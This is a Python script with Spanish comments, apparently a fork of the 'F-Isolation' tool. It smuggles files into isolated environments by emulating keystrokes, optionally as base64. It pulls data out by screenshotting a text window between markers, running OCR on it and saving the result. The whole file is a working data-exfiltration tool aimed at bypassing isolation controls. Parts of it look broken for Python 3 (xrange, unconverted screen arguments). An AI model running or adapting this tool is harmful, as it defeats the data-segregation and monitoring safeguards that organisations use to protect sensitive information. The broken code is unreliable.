#!/usr/bin/python3
#coding: utf-8

# Fork de F-Isolation modificado para entornos genéricos y haciendo funcional el script


# OCR + emulación de teclado.
# Requiere las librerias adicionales pyautogui y pytesseract

# 


import argparse
import pyautogui
import pytesseract
import time
import sys
import os.path
import base64
import pyfiglet

from PIL import Image
from tqdm import tqdm


def banner():
	ascii_banner = pyfiglet.figlet_format("Entornos Aislados")
	print(ascii_banner)

startpoint = "[AQUI-EMPIEZA]"
stoppoint = "[AQUI-TERMINA]"

# Convertir objeto del tipo imagen a String y devuelve el texto
def imageToString(image):
	text = pytesseract.image_to_string(image)
	return text

# Pantallazo del notepad para luego pasarlo por el OCR
def takeScreenshot(y,sizex,sizey):
	im = pyautogui.screenshot(region=(0,y,sizex,sizey))
	return im

# Extraccion del texto
def extractInfo(text):
	return text[text.index(startpoint) + len(startpoint):text.index(stoppoint)]

def exfiltrate():
	print ("[+] Iniciando transferencia")
	finalText = ""
	while 1:
		currentText = imageToString(takeScreenshot(args.axisy, args.sizex,args.sizey))
		try:
			currentText.index(stoppoint)
			finalText = finalText + currentText
			break
		except:
			finalText = finalText + currentText
			pyautogui.press('pagedown')
	print ("[+] Transferencia finalizada")
	return extractInfo(''.join(finalText.split("\n")))

# Lectura de ficheros en modo binario
def read_file_b(input_f):
	if os.path.isfile(input_f):
		try:
			with open(input_f, 'rb') as f:
				data = f.read()
		except:
			print ("[!] Error. El fichero no se puede abrir en modo 'Read Binary'")
	else:
		print ("[!] El fichero no existe")
		exit(-1)
	print ("[+] Lectura del fichero")
	return data

#Emulación de teclado

def keyboard_action(data, interval):
	if '\n' in data: # Ayuda para visualizar el progreso en caso de datos multilinea, borrar si da fallo
		data = data.split('\n')
		for line in tqdm(data):
			pyautogui.typewrite(line, interval=interval)
			pyautogui.press('return') 
	else:
		pyautogui.typewrite(data, interval=interval)
	print ("[+] Escritura por teclado finalizada")

# Salvado de datos al fichero
def dump_info(output_f, data):
	if not os.path.isfile(output_f):
		try:
			with open(output_f, 'wb') as outfile:
				outfile.writelines(data)
				print ("[+] Informacion salvada a: "+ str(output_f))
		except:
			print ("[!] Error. No se puede escribir el fichero de salida")
			exit(-1)
	else:
		print ("[!] El fichero ya existe")
		exit(-1)

# Tiempos de espera antes de la emu del teclado
def time_out_k(time_out):
	for i in reversed(xrange(1,time_out+1)): 
		sys.stdout.write("[+] Esperando "+str(i)+'s...\r')
		sys.stdout.flush()
		time.sleep(1)
	print ("")

# Codificar a base 64
def tranform_to_b64(data):
	return base64.b64encode(data)

# Parametros para exfiltracion de datos
parser = argparse.ArgumentParser()
parser.add_argument("--exfiltrate", dest="ofile", help="Fichero donde se salvan los datos erroneos")
parser.add_argument("--axisy", dest="axisy", help="Punto de inicio de la captura")
parser.add_argument("--sizey", dest="sizey", help="Tamanio del pantallazo en el eje Y")
parser.add_argument("--sizex", dest="sizex", help="Tamanio del pantallazo en el eje X")

# Parametros para infiltracion de datos
parser.add_argument('-k', "--keyboard",  action="store_true", default=False, help="Uso de teclado(si no está presente, se salva a fichero)")
parser.add_argument("-i", "--input", help="Fichero a transferir")
parser.add_argument("-t", "--timeout", type=int, default=5,
					help="Tiempo de espera antes de la escritura por teclado (por defecto 5s)")
parser.add_argument("-int", "--interval", type=float, default=0.0,
					help="Intervalo entre pulsaciones de teclado (por defecto 0.0 como marca autogui, cambiar si da fallo)")
parser.add_argument('-b64', "--base64",  action="store_true", default=False, help="Codificar en Base64 (por defecto False")
parser.add_argument("-o", "--output", help="Fichero de salida")

args = parser.parse_args()


# Main
banner()

if args.ofile: #exfiltration
	if args.axisy and args.sizey and args.sizex:
		print ("==========\n Modo exfiltración\n==========\n")
		time_out_k(args.timeout)	
		data = exfiltrate()
		dump_info(args.ofile, data)

elif args.input: #infiltration
	print ("==========\n Modo infiltracion \n==========\n")
	data = read_file_b(args.input)
	if args.base64:
		data = tranform_to_b64(data)
	if args.keyboard:
		time_out_k(args.timeout)
		keyboard_action(data, args.interval)
	if args.output:
		dump_info(args.output, data)
	
else:
	print ("[!] Modo erroneo")
